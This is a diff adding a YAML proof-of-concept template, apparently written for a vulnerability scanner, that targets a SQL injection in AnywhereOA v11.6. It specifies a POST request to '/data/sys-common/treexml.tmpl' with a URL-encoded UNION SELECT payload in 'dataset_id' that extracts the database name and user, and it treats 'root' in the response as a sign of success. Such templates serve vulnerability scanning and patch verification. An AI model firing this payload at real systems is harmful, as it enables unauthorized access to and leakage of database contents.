@@ -1,0 +1,36 @@
+#poc名称
+- name:
+  - name: "AnywhereOA_v11.6_report_bi.func.php_SQL"
+
+#请求方式
+- method:
+  - method: "post"
+
+#漏洞的位置
+- url:
+  - url : "/data/sys-common/treexml.tmpl"
+
+#payload
+- payload:
+  - payload: '_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&'
+
+#response包里状态码
+- status:
+  - status: "200"
+
+#response包里的关键字
+- word:
+  - word:
+      - "root"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "echo vuln"
